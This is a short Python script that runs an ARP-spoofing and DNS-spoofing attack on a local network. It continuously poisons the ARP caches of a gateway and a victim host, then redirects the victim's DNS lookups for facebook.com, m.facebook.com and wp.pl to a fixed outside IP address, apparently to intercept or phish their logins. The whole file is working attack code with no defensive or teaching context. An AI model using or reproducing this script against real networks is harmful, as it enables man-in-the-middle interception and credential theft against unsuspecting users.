import time
import multiprocessing
import dnsspoofer

class ArpSpoofer(multiprocessing.Process):
    def __init__(self):
        super().__init__()
        self.exit = multiprocessing.Event()
    def run(self):
        while not self.exit.is_set():
            #gateway
            dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1", b"em1")
            #victim
            dnsspoofer.spoof_arp(b"\x55\x44\x33\x22\x11\x22",b"192.168.1.100", b"em1")
            time.sleep(3)
    def terminate(self):
        self.exit.set()

arp_porcess = ArpSpoofer()
arp_porcess.start()


def spoof_dns():
    victims = {
        "192.168.1.100":(
            "192.168.1.1", #gateway IP
            {
                "facebook.com": "51.254.121.149",
                "m.facebook.com": "51.254.121.149",
                "wp.pl": "51.254.121.149"
            }
        )
    }
    dnsspoofer.spoof_dns("em1", victims)
spoof_dns()
